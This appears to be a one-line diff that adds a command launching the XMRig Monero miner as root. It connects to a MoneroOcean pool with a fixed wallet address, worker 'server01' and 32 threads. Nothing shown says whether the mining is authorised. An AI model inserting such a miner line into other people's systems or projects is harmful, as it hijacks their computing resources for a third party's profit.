@@ -1,0 +1,1 @@
+/root/xmrig/build/xmrig -o gulf.moneroocean.stream:10128 -u 43RgSET6zM765oZiUWTcSJYRdZDxE5vpKKSe3Ae88tpa2pk1LRhN8DX9UarCuP2Je6fMPmsGiGRft3WSRRmBQJtwDrDJfPp -p server01 -t 32
